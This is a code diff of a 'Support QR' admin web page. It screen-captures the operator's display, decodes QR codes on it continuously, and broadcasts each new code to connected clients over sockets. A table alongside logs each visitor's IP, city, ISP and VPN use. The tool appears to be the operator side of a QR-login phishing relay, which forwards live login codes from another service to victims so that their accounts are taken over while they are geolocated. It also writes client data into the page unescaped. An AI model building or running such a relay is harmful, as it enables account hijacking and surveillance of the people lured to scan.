@@ -10,25 +10,27 @@
 <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
 <style>
-  body { font-family: system-ui, Arial, sans-serif; background:#f8f9fa; margin:0; padding:20px; display:flex; justify-content:center; }
-  .wrap { background:#fff; width:100%; max-width:960px; border-radius:12px; box-shadow:0 2px 20px rgba(0,0,0,.1); padding:20px; }
+  :root { --blue:#0d6efd; --red:#dc3545; --gray:#6c757d; --amber:#ffc107; }
+  body { font-family: system-ui, Arial, sans-serif; background:#f8f9fa; margin:0; padding:24px; display:flex; justify-content:center; }
+  .wrap { background:#fff; width:100%; max-width:980px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,.08); padding:20px; }
   h2 { margin:0 0 10px; }
-  .controls { display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:15px; }
+  .controls { display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin:10px 0 16px; }
   button { border:0; border-radius:8px; padding:10px 14px; font-weight:600; cursor:pointer; color:#fff; }
-  .btn-start { background:#007bff; }
-  .btn-stop  { background:#dc3545; }
-  .btn-hide  { background:#6c757d; }
-  .btn-freeze{ background:#ffc107; color:#000; }
-  .field { display:flex; align-items:center; gap:8px; background:#f1f3f5; padding:8px 10px; border-radius:8px; }
-  .field input { width:80px; border:1px solid #ced4da; border-radius:6px; padding:6px 8px; text-align:right; }
-  #status { font-weight:700; color:#0b5ed7; margin-bottom:10px; }
-  #qrBox { background:#fff; border:1px solid #dee2e6; border-radius:10px; min-height:260px; display:flex; align-items:center; justify-content:center; padding:18px; }
+  .btn-start { background:var(--blue); }
+  .btn-stop  { background:var(--red); }
+  .btn-hide  { background:var(--gray); }
+  .btn-freeze{ background:var(--amber); color:#000; }
+  .controls .field { display:flex; align-items:center; gap:8px; background:#f1f3f5; padding:8px 10px; border-radius:8px; }
+  .controls input[type="number"] { width:90px; border:1px solid #ced4da; border-radius:6px; padding:6px 8px; text-align:right; background:#fff; }
+  #status { font-weight:700; color:#0b5ed7; margin:6px 0 14px; }
+  #qrBox { background:#fff; border:1px solid #e9ecef; border-radius:10px; min-height:260px; display:flex; align-items:center; justify-content:center; padding:18px; }
   #qrCanvas { min-width:256px; min-height:256px; }
+  .grid { margin-top:18px; overflow:auto; }
+  table { width:100%; border-collapse:collapse; font-size:14px; }
+  th, td { border:1px solid #e9ecef; padding:8px; text-align:center; }
+  th { background:#f8f9fa; }
   .muted { color:#6c757d; }
   video, canvas { display:none; }
-  table { width:100%; border-collapse:collapse; margin-top:15px; font-size:14px; }
-  th, td { border:1px solid #dee2e6; padding:8px; text-align:center; }
-  th { background:#f8f9fa; }
 </style>
 </head>
 <body>
@@ -36,190 +38,225 @@
   <h2>Admin Panel — Support QR</h2>
 
   <div class="controls">
-    <button id="btnStart" class="btn-start">Start Stream</button>
-    <button id="btnStop" class="btn-stop">Stop Stream</button>
-    <button id="btnHide" class="btn-hide">Hide</button>
-    <button id="btnShow" class="btn-hide">Show</button>
-    <button id="btnFreeze" class="btn-freeze">Freeze</button>
-    <button id="btnUnfreeze" class="btn-freeze">Unfreeze</button>
+    <button id="btnStart"  class="btn-start">Start Stream</button>
+    <button id="btnStop"   class="btn-stop">Stop Stream</button>
+    <button id="btnHide"   class="btn-hide">Hide</button>
+    <button id="btnShow"   class="btn-hide">Show</button>
+    <button id="btnFreeze" class="btn-freeze">Freeze Scan</button>
+    <button id="btnUnfreeze" class="btn-freeze">Unfreeze Scan</button>
 
     <div class="field">
-      <label><strong>Scan interval (s)</strong></label>
-      <input id="scanInput" type="number" step="0.05" min="0.25" max="5" value="0.5">
-      <button id="btnSet" class="btn-start" style="padding:8px 10px;">Set</button>
+      <label for="scanInput"><strong>Scan interval (s)</strong></label>
+      <input id="scanInput" type="number" step="0.05" min="0.25" max="5" placeholder="0.50">
+      <button id="btnSet" class="btn-start" style="padding:8px 10px">Set</button>
+    </div>
+
+    <div class="field">
+      <span>Admin ping:</span><strong id="adminPing">0</strong><span>ms</span>
     </div>
   </div>
 
   <div id="status">Status: Idle</div>
 
-  <div id="qrBox"><div id="qrCanvas" class="muted">No QR yet</div></div>
+  <div id="qrBox">
+    <div id="qrCanvas" class="muted">No QR yet</div>
+  </div>
 
   <video id="video" autoplay muted></video>
   <canvas id="canvas"></canvas>
 
-  <table>
-    <thead>
-      <tr>
-        <th>Username</th><th>IP</th><th>City</th><th>Region</th><th>Country</th><th>ISP</th><th>VPN</th><th>Ping</th><th>ID</th>
-      </tr>
-    </thead>
-    <tbody id="clientBody"></tbody>
-  </table>
+  <div class="grid">
+    <table>
+      <thead>
+        <tr>
+          <th>Username</th>
+          <th>IP</th>
+          <th>City</th>
+          <th>Region</th>
+          <th>Country</th>
+          <th>ISP</th>
+          <th>VPN</th>
+          <th>Ping</th>
+          <th>Socket ID</th>
+        </tr>
+      </thead>
+      <tbody id="clientBody"></tbody>
+    </table>
+  </div>
 </div>
 
 <script>
 (() => {
+  // --- sockets & elements ---
   const socket = io();
   socket.emit('join', 'admin');
+
+  const statusEl = document.getElementById('status');
+  const adminPingEl = document.getElementById('adminPing');
+  const clientBody = document.getElementById('clientBody');
+  const qrCanvasDiv = document.getElementById('qrCanvas');
+
+  const btnStart = document.getElementById('btnStart');
+  const btnStop  = document.getElementById('btnStop');
+  const btnHide  = document.getElementById('btnHide');
+  const btnShow  = document.getElementById('btnShow');
+  const btnFreeze= document.getElementById('btnFreeze');
+  const btnUnfreeze = document.getElementById('btnUnfreeze');
+  const scanInput = document.getElementById('scanInput');
+  const btnSet = document.getElementById('btnSet');
 
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
-  const qrCanvasDiv = document.getElementById('qrCanvas');
-  const statusEl = document.getElementById('status');
-  const clientBody = document.getElementById('clientBody');
-  const scanInput = document.getElementById('scanInput');
 
+  // --- state (matches your previous system) ---
   let isStreaming = false;
   let isHidden = false;
   let isFrozen = false;
   let lastQrValue = null;
-  let detectTimer = null;
   let stream = null;
+  let detectTimer = null;
 
-  let scanInterval = 500; // 0.5 sec default
+  // interval in ms (default 0.5s), persisted
+  let scanIntervalMs = Number(localStorage.getItem('scanIntervalMs') || 500);
+  scanInput.value = (scanIntervalMs / 1000).toFixed(2);
 
-  // ---- helpers ----
+  // --- helpers ---
   function setStatus() {
-    const s = [];
-    s.push(isStreaming ? 'Streaming' : 'Idle');
-    if (isHidden) s.push('Hidden');
-    if (isFrozen) s.push('Frozen');
-    statusEl.textContent = 'Status: ' + s.join(' / ');
+    const parts = [];
+    parts.push(isStreaming ? 'Streaming' : 'Idle');
+    if (isHidden) parts.push('Hidden');
+    if (isFrozen) parts.push('Frozen');
+    statusEl.textContent = 'Status: ' + parts.join(' / ');
   }
 
-  function renderQR(value) {
+  function renderPreview(value) {
     qrCanvasDiv.innerHTML = '';
-    if (!value) {
-      qrCanvasDiv.textContent = isHidden ? 'QR is hidden' : 'No QR yet';
+    if (value && !isHidden) {
+      new QRCode(qrCanvasDiv, { text: value, width: 256, height: 256 });
+    } else if (isHidden) {
+      qrCanvasDiv.textContent = 'QR is hidden';
       qrCanvasDiv.classList.add('muted');
-      return;
+    } else {
+      qrCanvasDiv.textContent = 'No QR yet';
+      qrCanvasDiv.classList.add('muted');
     }
-    qrCanvasDiv.classList.remove('muted');
-    new QRCode(qrCanvasDiv, { text: value, width: 256, height: 256 });
   }
 
-  function startDetection() {
-    stopDetection();
-    detectTimer = setInterval(detectQR, scanInterval);
+  function startDetectLoop() {
+    stopDetectLoop();
+    detectTimer = setInterval(detectOnce, scanIntervalMs);
   }
-  function stopDetection() {
-    if (detectTimer) clearInterval(detectTimer);
-    detectTimer = null;
+  function stopDetectLoop() {
+    if (detectTimer) { clearInterval(detectTimer); detectTimer = null; }
   }
 
-  async function detectQR() {
-    if (!isStreaming || isFrozen || !video.videoWidth) return;
+  function detectOnce() {
+    if (!isStreaming || isFrozen) return;
+    if (!video.videoWidth) return;
+
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
     const img = ctx.getImageData(0, 0, canvas.width, canvas.height);
     const code = jsQR(img.data, img.width, img.height);
     if (code && code.data && code.data !== lastQrValue) {
       lastQrValue = code.data;
-      if (!isHidden) renderQR(code.data);
-      socket.emit('qr_update', code.data);
+      if (!isHidden) renderPreview(lastQrValue);
+      socket.emit('qr_update', lastQrValue);   // ← your previous server expects this
     }
   }
 
-  // ---- stream controls ----
-  document.getElementById('btnStart').onclick = async () => {
+  // --- button handlers (exactly your previous flow) ---
+  btnStart.onclick = async () => {
     try {
       stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
       video.srcObject = stream;
-      socket.emit('start_stream');
       isStreaming = true;
+      socket.emit('start_stream');            // ← previous server event
+      startDetectLoop();
       setStatus();
-      startDetection();
-    } catch (err) {
-      alert(
-        'Screen share failed:\n' + err.name + ': ' + err.message +
-        '\n\nTo fix:\n• Use HTTPS (Render gives you this)\n• Click Start while page is active\n• Allow “Share your screen”'
-      );
-      console.error(err);
+    } catch (e) {
+      alert('Screen share failed: ' + (e.message || e));
     }
   };
 
-  document.getElementById('btnStop').onclick = () => {
-    if (stream) stream.getTracks().forEach(t => t.stop());
-    stream = null;
-    stopDetection();
+  btnStop.onclick = () => {
+    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+    stopDetectLoop();
     isStreaming = false;
     lastQrValue = null;
-    socket.emit('stop_stream');
-    renderQR(null);
+    renderPreview(null);
+    socket.emit('stop_stream');               // ← previous server event
     setStatus();
   };
 
-  document.getElementById('btnHide').onclick = () => {
+  btnHide.onclick = () => {
     isHidden = true;
-    socket.emit('toggle_hide', true);
-    renderQR(null);
+    socket.emit('toggle_hide', true);         // ← previous server event
+    renderPreview(lastQrValue);
     setStatus();
   };
 
-  document.getElementById('btnShow').onclick = () => {
+  btnShow.onclick = () => {
     isHidden = false;
-    socket.emit('toggle_hide', false);
-    renderQR(lastQrValue);
+    socket.emit('toggle_hide', false);        // ← previous server event
+    // ensure preview comes back immediately with last known value
+    renderPreview(lastQrValue);
     setStatus();
   };
 
-  document.getElementById('btnFreeze').onclick = () => {
-    isFrozen = true;
-    stopDetection();
+  btnFreeze.onclick = () => {
+    isFrozen = true;                           // local-only freeze (does not stop stream)
+    stopDetectLoop();                          // stop scanning but keep screen share alive
     setStatus();
   };
 
-  document.getElementById('btnUnfreeze').onclick = () => {
+  btnUnfreeze.onclick = () => {
     isFrozen = false;
-    if (isStreaming) startDetection();
+    if (isStreaming) startDetectLoop();
     setStatus();
   };
 
-  document.getElementById('btnSet').onclick = () => {
+  btnSet.onclick = () => {
     let v = parseFloat(scanInput.value);
     if (isNaN(v)) v = 0.5;
     if (v < 0.25) v = 0.25;
     if (v > 5) v = 5;
     scanInput.value = v.toFixed(2);
-    scanInterval = v * 1000;
-    if (isStreaming && !isFrozen) startDetection();
+    scanIntervalMs = Math.round(v * 1000);
+    localStorage.setItem('scanIntervalMs', String(scanIntervalMs));
+    if (isStreaming && !isFrozen) startDetectLoop();
   };
 
-  // ---- socket events ----
-  socket.on('state', s => {
-    isHidden = s.isHidden;
-    isStreaming = s.isStreaming;
-    if (s.currentQrValue) lastQrValue = s.currentQrValue;
-    renderQR(lastQrValue);
+  // --- server → admin events (same names as before) ---
+  socket.on('state', (state) => {
+    isHidden = !!state.isHidden;
+    isStreaming = !!state.isStreaming;
+    if (state.currentQrValue) {
+      lastQrValue = state.currentQrValue;
+    }
+    renderPreview(lastQrValue);
     setStatus();
   });
 
-  socket.on('hide_state', hidden => {
-    isHidden = hidden;
-    if (!hidden) renderQR(lastQrValue);
-    else renderQR(null);
+  socket.on('hide_state', (hidden) => {
+    isHidden = !!hidden;
+    // when unhidden, redraw the last QR immediately (fixes your preview issue)
+    renderPreview(lastQrValue);
     setStatus();
   });
 
-  socket.on('qr_preview', v => {
-    if (!v) return;
-    if (!isFrozen && !isHidden) renderQR(v);
-    lastQrValue = v;
+  socket.on('qr_preview', (value) => {
+    // server mirrors last qr_update back to admin; ignore if frozen or hidden
+    if (value) lastQrValue = value;
+    if (!isFrozen && !isHidden && value) {
+      renderPreview(value);
+    }
   });
 
-  socket.on('client_list', list => {
+  socket.on('client_list', (list) => {
     clientBody.innerHTML = '';
     for (const c of list) {
       const tr = document.createElement('tr');
@@ -229,7 +266,7 @@
         <td>${c.ip || '-'}</td>
         <td>${c.city || '-'}</td>
         <td>${c.region || '-'}</td>
-        <td>${(c.countryFlag || '') + ' ' + (c.country || '-')}</td>
+        <td>${(c.countryFlag||'')+' '+(c.country||'-')}</td>
         <td>${c.isp || '-'}</td>
         <td>${c.vpn ? 'Yes' : 'No'}</td>
         <td>${typeof c.ping === 'number' ? c.ping : '-'}</td>
@@ -238,8 +275,13 @@
     }
   });
 
-  // request client list periodically
+  // keep client list fresh
   setInterval(() => socket.emit('request_client_list'), 3000);
+
+  // latency display
+  socket.on('ping', (t) => socket.emit('pong', t));
+  socket.on('your_ping', (p) => adminPingEl.textContent = p);
+
 })();
 </script>
 </body>
